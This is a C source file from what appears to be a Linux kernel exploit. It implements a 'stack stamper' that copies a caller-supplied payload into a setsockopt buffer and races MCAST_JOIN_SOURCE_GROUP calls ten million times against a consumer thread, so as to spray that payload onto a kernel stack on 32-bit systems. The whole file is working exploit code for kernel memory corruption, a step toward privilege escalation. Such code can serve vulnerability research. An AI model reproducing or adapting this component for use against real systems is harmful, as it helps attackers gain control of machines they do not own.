/*
 * exp32 stack stamper — sprays the payload onto the waiter's kernel
 * stack via MCAST_JOIN_SOURCE_GROUP setsockopt racing the consumer.
 * 32-bit only (see main.c).
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "kernelsnitch/utils.h"

extern atomic_int g_consumer_go;

void do_stamp_stack(uint64_t *buf){
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[260];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        return;
    }
    memcpy(buffer+0x34,buf,0x50);
    uint64_t times = 10000000;

    while (times--)
    {
        atomic_store(&g_consumer_go, 1);
        // racing
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer, 260);
    }
	close(fd);
}
